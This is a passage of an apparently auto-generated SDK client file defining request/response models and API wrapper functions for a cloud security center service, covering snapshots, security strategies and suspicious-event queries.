    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  snapshots?: [ 
    {
      actualBytes?: long(name='ActualBytes'),
      actualItems?: long(name='ActualItems'),
      bytesDone?: long(name='BytesDone'),
      bytesTotal?: long(name='BytesTotal'),
      clientId?: string(name='ClientId'),
      clientVersion?: string(name='ClientVersion'),
      createdTime?: long(name='CreatedTime'),
      errorFile?: string(name='ErrorFile'),
      instanceId?: string(name='InstanceId'),
      itemsDone?: long(name='ItemsDone'),
      itemsTotal?: long(name='ItemsTotal'),
      jobId?: string(name='JobId'),
      parentSnapshotHash?: string(name='ParentSnapshotHash'),
      path?: string(name='Path'),
      paths?: [ string ](name='Paths'),
      planId?: string(name='PlanId'),
      regionId?: string(name='RegionId'),
      retention?: long(name='Retention'),
      snapshotHash?: string(name='SnapshotHash'),
      snapshotId?: string(name='SnapshotId'),
      sourceType?: string(name='SourceType'),
      status?: string(name='Status'),
      uuid?: string(name='Uuid'),
      vaultId?: string(name='VaultId'),
    }
  ](name='Snapshots'),
}

model DescribeSnapshotsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSnapshotsResponseBody(name='body'),
}

async function describeSnapshotsWithOptions(request: DescribeSnapshotsRequest, runtime: Util.RuntimeOptions): DescribeSnapshotsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.apiVersion)) {
    query['ApiVersion'] = request.apiVersion;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.isAliYunEcs)) {
    query['IsAliYunEcs'] = request.isAliYunEcs;
  }
  if (!Util.isUnset(request.machineRegion)) {
    query['MachineRegion'] = request.machineRegion;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.nextToken)) {
    query['NextToken'] = request.nextToken;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSnapshots',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSnapshots(request: DescribeSnapshotsRequest): DescribeSnapshotsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSnapshotsWithOptions(request, runtime);
}

model DescribeStrategyRequest {
  customType?: string(name='CustomType'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  strategyIds?: string(name='StrategyIds'),
}

model DescribeStrategyResponseBody = {
  requestId?: string(name='RequestId'),
  strategies?: [ 
    {
      configTargets?: [ 
        {
          flag?: string(name='Flag'),
          target?: string(name='Target'),
          targetType?: string(name='TargetType'),
        }
      ](name='ConfigTargets'),
      customType?: string(name='CustomType'),
      cycleDays?: int32(name='CycleDays'),
      cycleStartTime?: int32(name='CycleStartTime'),
      ecsCount?: int32(name='EcsCount'),
      endTime?: string(name='EndTime'),
      execStatus?: int32(name='ExecStatus'),
      id?: int32(name='Id'),
      name?: string(name='Name'),
      passRate?: int32(name='PassRate'),
      processRate?: int32(name='ProcessRate'),
      riskCount?: int32(name='RiskCount'),
      startTime?: string(name='StartTime'),
      type?: int32(name='Type'),
    }
  ](name='Strategies'),
}

model DescribeStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyResponseBody(name='body'),
}

async function describeStrategyWithOptions(request: DescribeStrategyRequest, runtime: Util.RuntimeOptions): DescribeStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.customType)) {
    query['CustomType'] = request.customType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyIds)) {
    query['StrategyIds'] = request.strategyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategy(request: DescribeStrategyRequest): DescribeStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyWithOptions(request, runtime);
}

model DescribeStrategyDetailRequest {
  id?: string(name='Id'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeStrategyDetailResponseBody = {
  requestId?: string(name='RequestId'),
  strategy?: {
    customType?: string(name='CustomType'),
    cycleDays?: int32(name='CycleDays'),
    cycleStartTime?: int32(name='CycleStartTime'),
    endTime?: string(name='EndTime'),
    id?: int32(name='Id'),
    name?: string(name='Name'),
    riskSubTypeName?: string(name='RiskSubTypeName'),
    riskTypeWhiteListQueryResultList?: [ 
      {
        alias?: string(name='Alias'),
        on?: boolean(name='On'),
        subTypes?: [ 
          {
            alias?: string(name='Alias'),
            checkDetails?: [ 
              {
                checkDesc?: string(name='CheckDesc'),
                checkId?: long(name='CheckId'),
                checkItem?: string(name='CheckItem'),
                rules?: [ 
                  {
                    defaultValue?: int32(name='DefaultValue'),
                    optional?: int32(name='Optional'),
                    paramList?: [ 
                      {
                        enumValue?: string(name='EnumValue'),
                        maxValue?: int32(name='MaxValue'),
                        minValue?: int32(name='MinValue'),
                        paramDefaultValue?: string(name='ParamDefaultValue'),
                        paramDesc?: string(name='ParamDesc'),
                        paramName?: string(name='ParamName'),
                        paramType?: int32(name='ParamType'),
                        value?: string(name='Value'),
                      }
                    ](name='ParamList'),
                    ruleDesc?: string(name='RuleDesc'),
                    ruleId?: string(name='RuleId'),
                  }
                ](name='Rules'),
              }
            ](name='CheckDetails'),
            on?: boolean(name='On'),
            typeName?: string(name='TypeName'),
          }
        ](name='SubTypes'),
        typeName?: string(name='TypeName'),
      }
    ](name='RiskTypeWhiteListQueryResultList'),
    startTime?: string(name='StartTime'),
    targetType?: string(name='TargetType'),
    type?: int32(name='Type'),
  }(name='Strategy'),
}

model DescribeStrategyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyDetailResponseBody(name='body'),
}

async function describeStrategyDetailWithOptions(request: DescribeStrategyDetailRequest, runtime: Util.RuntimeOptions): DescribeStrategyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategyDetail(request: DescribeStrategyDetailRequest): DescribeStrategyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyDetailWithOptions(request, runtime);
}

model DescribeStrategyExecDetailRequest {
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  sourceIp?: string(name='SourceIp'),
  strategyId?: int32(name='StrategyId'),
}

model DescribeStrategyExecDetailResponseBody = {
  endTime?: string(name='EndTime'),
  failCount?: int32(name='FailCount'),
  failedEcsList?: [ 
    {
      IP?: string(name='IP'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      reason?: string(name='Reason'),
    }
  ](name='FailedEcsList'),
  inProcessCount?: int32(name='InProcessCount'),
  percent?: string(name='Percent'),
  requestId?: string(name='RequestId'),
  source?: string(name='Source'),
  startTime?: string(name='StartTime'),
  successCount?: int32(name='SuccessCount'),
}

model DescribeStrategyExecDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyExecDetailResponseBody(name='body'),
}

async function describeStrategyExecDetailWithOptions(request: DescribeStrategyExecDetailRequest, runtime: Util.RuntimeOptions): DescribeStrategyExecDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyExecDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategyExecDetail(request: DescribeStrategyExecDetailRequest): DescribeStrategyExecDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyExecDetailWithOptions(request, runtime);
}

model DescribeStrategyTargetRequest {
  config?: string(name='Config'),
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
}

model DescribeStrategyTargetResponseBody = {
  requestId?: string(name='RequestId'),
  strategyTargets?: [ 
    {
      bindUuidCount?: int32(name='BindUuidCount'),
      flag?: string(name='Flag'),
      target?: string(name='Target'),
      targetType?: string(name='TargetType'),
    }
  ](name='StrategyTargets'),
}

model DescribeStrategyTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyTargetResponseBody(name='body'),
}

async function describeStrategyTargetWithOptions(request: DescribeStrategyTargetRequest, runtime: Util.RuntimeOptions): DescribeStrategyTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategyTarget(request: DescribeStrategyTargetRequest): DescribeStrategyTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyTargetWithOptions(request, runtime);
}

model DescribeSummaryInfoRequest {
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeSummaryInfoResponseBody = {
  aegisClientOfflineCount?: int32(name='AegisClientOfflineCount'),
  aegisClientOnlineCount?: int32(name='AegisClientOnlineCount'),
  requestId?: string(name='RequestId'),
  securityScore?: int32(name='SecurityScore'),
  success?: boolean(name='Success'),
}

model DescribeSummaryInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSummaryInfoResponseBody(name='body'),
}

async function describeSummaryInfoWithOptions(request: DescribeSummaryInfoRequest, runtime: Util.RuntimeOptions): DescribeSummaryInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSummaryInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSummaryInfo(request: DescribeSummaryInfoRequest): DescribeSummaryInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSummaryInfoWithOptions(request, runtime);
}

model DescribeSupportRegionResponseBody = {
  requestId?: string(name='RequestId'),
  supportRegion?: [ string ](name='SupportRegion'),
}

model DescribeSupportRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSupportRegionResponseBody(name='body'),
}

async function describeSupportRegionWithOptions(runtime: Util.RuntimeOptions): DescribeSupportRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeSupportRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSupportRegion(): DescribeSupportRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSupportRegionWithOptions(runtime);
}

model DescribeSuspEventDetailRequest {
  from?: string(name='From'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
  suspiciousEventId?: int32(name='SuspiciousEventId'),
}

model DescribeSuspEventDetailResponseBody = {
  canBeDealOnLine?: boolean(name='CanBeDealOnLine'),
  dataSource?: string(name='DataSource'),
  details?: [ 
    {
      nameDisplay?: string(name='NameDisplay'),
      type?: string(name='Type'),
      value?: string(name='Value'),
    }
  ](name='Details'),
  eventDesc?: string(name='EventDesc'),
  eventName?: string(name='EventName'),
  eventStatus?: string(name='EventStatus'),
  eventTypeDesc?: string(name='EventTypeDesc'),
  id?: int32(name='Id'),
  instanceName?: string(name='InstanceName'),
  internetIp?: string(name='InternetIp'),
  intranetIp?: string(name='IntranetIp'),
  lastTime?: string(name='LastTime'),
  level?: string(name='Level'),
  operateErrorCode?: string(name='OperateErrorCode'),
  operateMsg?: string(name='OperateMsg'),
  requestId?: string(name='RequestId'),
  saleVersion?: string(name='SaleVersion'),
  uuid?: string(name='Uuid'),
}

model DescribeSuspEventDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventDetailResponseBody(name='body'),
}

async function describeSuspEventDetailWithOptions(request: DescribeSuspEventDetailRequest, runtime: Util.RuntimeOptions): DescribeSuspEventDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.suspiciousEventId)) {
    query['SuspiciousEventId'] = request.suspiciousEventId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventDetail(request: DescribeSuspEventDetailRequest): DescribeSuspEventDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventDetailWithOptions(request, runtime);
}

model DescribeSuspEventExportInfoRequest {
  exportId?: int32(name='ExportId'),
}

model DescribeSuspEventExportInfoResponseBody = {
  exportStatus?: string(name='ExportStatus'),
  fileName?: string(name='FileName'),
  gmtCreate?: long(name='GmtCreate'),
  gmtModified?: long(name='GmtModified'),
  id?: int32(name='Id'),
  link?: string(name='Link'),
  progress?: int32(name='Progress'),
  properties?: string(name='Properties'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
  type?: string(name='Type'),
}

model DescribeSuspEventExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventExportInfoResponseBody(name='body'),
}

async function describeSuspEventExportInfoWithOptions(request: DescribeSuspEventExportInfoRequest, runtime: Util.RuntimeOptions): DescribeSuspEventExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventExportInfo(request: DescribeSuspEventExportInfoRequest): DescribeSuspEventExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventExportInfoWithOptions(request, runtime);
}

model DescribeSuspEventQuaraFilesRequest {
  currentPage?: string(name='CurrentPage'),
  from?: string(name='From'),
  groupId?: string(name='GroupId', deprecated='true'),
  groupingId?: long(name='GroupingId'),
  pageSize?: string(name='PageSize'),
  quaraTag?: string(name='QuaraTag'),
  sourceIp?: string(name='SourceIp'),
  status?: string(name='Status'),
}

model DescribeSuspEventQuaraFilesResponseBody = {
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  quaraFiles?: [ 
    {
      eventName?: string(name='EventName'),
      eventType?: string(name='EventType'),
      id?: int32(name='Id'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      ip?: string(name='Ip'),
      link?: string(name='Link'),
      md5?: string(name='Md5'),
      modifyTime?: string(name='ModifyTime'),
      path?: string(name='Path'),
      status?: string(name='Status'),
      tag?: string(name='Tag'),
      uuid?: string(name='Uuid'),
    }
  ](name='QuaraFiles'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeSuspEventQuaraFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventQuaraFilesResponseBody(name='body'),
}

async function describeSuspEventQuaraFilesWithOptions(request: DescribeSuspEventQuaraFilesRequest, runtime: Util.RuntimeOptions): DescribeSuspEventQuaraFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.groupingId)) {
    query['GroupingId'] = request.groupingId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.quaraTag)) {
    query['QuaraTag'] = request.quaraTag;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventQuaraFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventQuaraFiles(request: DescribeSuspEventQuaraFilesRequest): DescribeSuspEventQuaraFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventQuaraFilesWithOptions(request, runtime);
}

model DescribeSuspEventUserSettingRequest {
  from?: string(name='From'),
  id?: int32(name='Id'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeSuspEventUserSettingResponseBody = {
  levelsOn?: [ string ](name='LevelsOn'),
  requestId?: string(name='RequestId'),
}

model DescribeSuspEventUserSettingResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventUserSettingResponseBody(name='body'),
}

async function describeSuspEventUserSettingWithOptions(request: DescribeSuspEventUserSettingRequest, runtime: Util.RuntimeOptions): DescribeSuspEventUserSettingResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventUserSetting',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventUserSetting(request: DescribeSuspEventUserSettingRequest): DescribeSuspEventUserSettingResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventUserSettingWithOptions(request, runtime);
}

model DescribeSuspEventsRequest {
  alarmUniqueInfo?: string(name='AlarmUniqueInfo'),
  assetsTypeList?: [ string ](name='AssetsTypeList'),
  clusterId?: string(name='ClusterId'),
  containerFieldName?: string(name='ContainerFieldName'),
  containerFieldValue?: string(name='ContainerFieldValue'),
  currentPage?: string(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  eventNames?: string(name='EventNames'),
  from?: string(name='From'),
  groupId?: long(name='GroupId'),
  id?: long(name='Id'),
  lang?: string(name='Lang'),
  levels?: string(name='Levels'),
  name?: string(name='Name'),
  operateErrorCodeList?: [ string ](name='OperateErrorCodeList'),
  operateTimeEnd?: string(name='OperateTimeEnd'),
  operateTimeStart?: string(name='OperateTimeStart'),
  pageSize?: string(name='PageSize'),
  parentEventTypes?: string(name='ParentEventTypes'),
  remark?: string(name='Remark'),
  sortColumn?: string(name='SortColumn'),
  sortType?: string(name='SortType'),
  source?: string(name='Source'),
  sourceIp?: string(name='SourceIp'),
  status?: string(name='Status'),
  tacticId?: string(name='TacticId'),
  targetType?: string(name='TargetType'),
  timeEnd?: string(name='TimeEnd'),
  timeStart?: string(name='TimeStart'),
  uniqueInfo?: string(name='UniqueInfo'),
  uuids?: string(name='Uuids'),
}

model DescribeSuspEventsResponseBody = {
  count?: int32(name='Count'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  suspEvents?: [ 
    {
      advanced?: boolean(name='Advanced'),
      alarmEventName?: string(name='AlarmEventName'),
      alarmEventNameDisplay?: string(name='AlarmEventNameDisplay'),
      alarmEventType?: string(name='AlarmEventType'),
      alarmEventTypeDisplay?: string(name='AlarmEventTypeDisplay'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo'),
      appName?: string(name='AppName'),
      autoBreaking?: boolean(name='AutoBreaking'),
      canBeDealOnLine?: boolean(name='CanBeDealOnLine'),
      canCancelFault?: boolean(name='CanCancelFault'),
      containHwMode?: boolean(name='ContainHwMode'),
      containerId?: string(name='ContainerId'),
      containerImageId?: string(name='ContainerImageId'),
      containerImageName?: string(name='ContainerImageName'),
      dataSource?: string(name='DataSource'),
      desc?: string(name='Desc'),
      details?: [ 
        {
          nameDisplay?: string(name='NameDisplay'),
          type?: string(name='Type'),
          value?: string(name='Value'),
          valueDisplay?: string(name='ValueDisplay'),
        }
      ](name='Details'),
      displaySandboxResult?: boolean(name='DisplaySandboxResult'),
      eventNotes?: [ 
        {
          note?: string(name='Note'),
          noteId?: long(name='NoteId'),
          noteTime?: string(name='NoteTime'),
        }
      ](name='EventNotes'),
      eventStatus?: int32(name='EventStatus'),
      eventSubType?: string(name='EventSubType'),
      hasTraceInfo?: boolean(name='HasTraceInfo'),
      id?: long(name='Id'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      k8sClusterId?: string(name='K8sClusterId'),
      k8sClusterName?: string(name='K8sClusterName'),
      k8sNamespace?: string(name='K8sNamespace'),
      k8sNodeId?: string(name='K8sNodeId'),
      k8sNodeName?: string(name='K8sNodeName'),
      k8sPodName?: string(name='K8sPodName'),
      lastTime?: string(name='LastTime'),
      lastTimeStamp?: long(name='LastTimeStamp'),
      level?: string(name='Level'),
      maliciousRuleStatus?: string(name='MaliciousRuleStatus'),
      markMisRules?: string(name='MarkMisRules'),
      name?: string(name='Name'),
      occurrenceTime?: string(name='OccurrenceTime'),
      occurrenceTimeStamp?: long(name='OccurrenceTimeStamp'),
      operateErrorCode?: string(name='OperateErrorCode'),
      operateMsg?: string(name='OperateMsg'),
      operateTime?: long(name='OperateTime'),
      saleVersion?: string(name='SaleVersion'),
      securityEventIds?: string(name='SecurityEventIds'),
      stages?: string(name='Stages'),
      tacticItems?: [ 
        {
          tacticDisplayName?: string(name='TacticDisplayName'),
          tacticId?: string(name='TacticId'),
        }
      ](name='TacticItems'),
      uniqueInfo?: string(name='UniqueInfo'),
      uuid?: string(name='Uuid'),
      clusterId?: string(name='clusterId'),
    }
  ](name='SuspEvents'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventsResponseBody(name='body'),
}

async function describeSuspEventsWithOptions(request: DescribeSuspEventsRequest, runtime: Util.RuntimeOptions): DescribeSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alarmUniqueInfo)) {
    query['AlarmUniqueInfo'] = request.alarmUniqueInfo;
  }
  if (!Util.isUnset(request.assetsTypeList)) {
    query['AssetsTypeList'] = request.assetsTypeList;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.eventNames)) {
    query['EventNames'] = request.eventNames;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.operateErrorCodeList)) {
    query['OperateErrorCodeList'] = request.operateErrorCodeList;
  }
  if (!Util.isUnset(request.operateTimeEnd)) {
    query['OperateTimeEnd'] = request.operateTimeEnd;
  }
  if (!Util.isUnset(request.operateTimeStart)) {
    query['OperateTimeStart'] = request.operateTimeStart;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.parentEventTypes)) {
    query['ParentEventTypes'] = request.parentEventTypes;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sortColumn)) {
    query['SortColumn'] = request.sortColumn;
  }
  if (!Util.isUnset(request.sortType)) {
    query['SortType'] = request.sortType;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.tacticId)) {
    body['TacticId'] = request.tacticId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEvents(request: DescribeSuspEventsRequest): DescribeSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventsWithOptions(request, runtime);
}

model DescribeSuspiciousOverallConfigRequest {
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
}

model DescribeSuspiciousOverallConfigResponseBody = {
  overallConfig?: {
    config?: string(name='Config'),
    type?: string(name='Type'),
  }(name='OverallConfig'),
  requestId?: string(name='RequestId'),
}

model DescribeSuspiciousOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
